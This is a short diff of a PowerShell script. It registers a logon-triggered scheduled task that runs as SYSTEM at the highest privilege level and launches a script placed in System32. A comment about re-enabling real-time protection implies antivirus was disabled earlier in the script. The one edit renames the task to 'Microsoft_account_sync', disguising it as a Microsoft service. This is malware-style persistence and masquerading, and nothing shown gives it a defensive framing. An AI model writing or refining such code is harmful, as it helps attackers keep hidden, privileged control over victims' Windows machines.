@@ -15,7 +15,7 @@ $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfil
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 # register scheduled task
-Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trigger -Principal $principal
+Register-ScheduledTask -TaskName "Microsoft_account_sync" -Action $action -Trigger $trigger -Principal $principal
 # start process
 & "C:\Windows\System32\ddrcc.ps1"
 # re-enable real time protection
